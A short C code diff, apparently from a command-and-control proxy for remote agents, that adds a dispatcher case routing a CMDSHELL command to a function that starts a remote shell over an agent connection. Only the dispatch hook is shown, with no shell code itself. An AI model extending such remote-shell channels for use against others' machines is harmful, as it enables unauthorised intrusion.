@@ -10,6 +10,8 @@
 #include"CC_Msg_module.h"
 #include"CCProxy.h"
 #include "../AgentManager/AgentConversationCTRL.h"
+#include "../AgentManager/PCConn.h"
+#include "CC_ShellCtrl.h"
 
 
 pPCConn CMDCTRL_BuildTargetSock(int targetid,int ccproxy_cmd){
@@ -41,6 +43,9 @@ int CMDCTRL_onNewTunnel(pPCConn conn){
     case AGENT_CONN_COMMAND_CONNECT:
         Printf_DEBUG("AGENT_CONN_COMMAND_CONNECT");
         m_onAgentConnect(conn);
+        break;
+    case AGENT_SERVER_COMMAND_CMDSHELL:
+        CC_onStartShellhere(conn);
         break;
     default :
         Printf_Error("CCProxy_onNewTunnel Error CMD(%d)",
